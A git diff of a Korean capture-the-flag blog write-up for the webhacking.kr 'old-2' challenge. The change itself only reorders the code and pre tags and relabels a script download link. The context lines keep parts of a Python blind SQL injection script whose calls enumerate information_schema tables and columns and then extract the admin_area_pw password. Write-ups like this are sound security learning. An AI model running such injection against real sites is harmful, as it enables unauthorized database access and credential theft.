@@ -41,8 +41,8 @@ sitemap:
 	현재 알고 있는 정보가 아무것도 없으니 table->column->password 순으로 알아내야 합니다.<br>
 	스크립트는 아래와 같이 짰습니다.
 </p>
-<code>
-	<pre>import urllib, urllib.request, re
+<pre>
+	<code>import urllib, urllib.request, re
 
 #phpsessid에는 본인의 쿠키에 있는 값을 입력
 phpsessid = ""
@@ -109,9 +109,9 @@ def find(name, col, table):
 if __name__ == "__main__":
 	find("tables", "table_name", "information_schema.tables where table_schema=database()") #현재 선택된 DB의 테이블을 탐색
 	find("cols", "column_name", "information_schema.columns where table_name='admin_area_pw'") #위 함수로 알아낸 admin_area_pw 테이블의 칼럼을 탐색
-	find("password", "pw", "admin_area_pw") #위 함수로 알아낸 pw 칼럼의 값을 탐색</pre>
-</code>
-<center><a href="/files/posts/webhacking-kr-old-2/webkr2passwd.py" download>script download</a><br></center>
+	find("password", "pw", "admin_area_pw") #위 함수로 알아낸 pw 칼럼의 값을 탐색</code>
+</pre>
+<center>script download: <a href="/files/posts/webhacking-kr-old-2/webkr2passwd.py" download>webkr2passwd.py</a><br></center>
 <p>
 	스크립트에 대한 간단한 설명은 주석으로 달아놓았습니다.<br>
 	DB의 태이블로 log, admin_area_pw가 나왔는데, 이 중 저희가 필요한 정보가 있을 것으로 추정되는 테이블은 admin_area_pw입니다.<br>
